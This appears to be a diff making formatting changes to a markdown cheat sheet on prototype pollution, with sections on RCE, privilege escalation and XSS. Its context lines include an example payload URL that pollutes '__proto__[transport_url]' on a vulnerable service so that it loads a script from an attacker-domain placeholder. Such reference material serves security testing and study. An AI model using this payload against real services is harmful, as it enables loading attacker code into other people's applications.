@@ -1,6 +1,7 @@
 # Prototype Pollution
 
 ## Table of Contents
+
 - [RCE](#rce)
 - [Privilege Escalation](#privilege-escalation)
 - [XSS](#xss)
@@ -46,7 +47,7 @@
 
 - Loading an attacker-controlled script through an unset library option
     1. Polluted property
-        ```
+        ```text
         https://[VULNERABLE-SERVICE]/?__proto__[transport_url]=https://[ATTACKER-DOMAIN]/
         ```
 
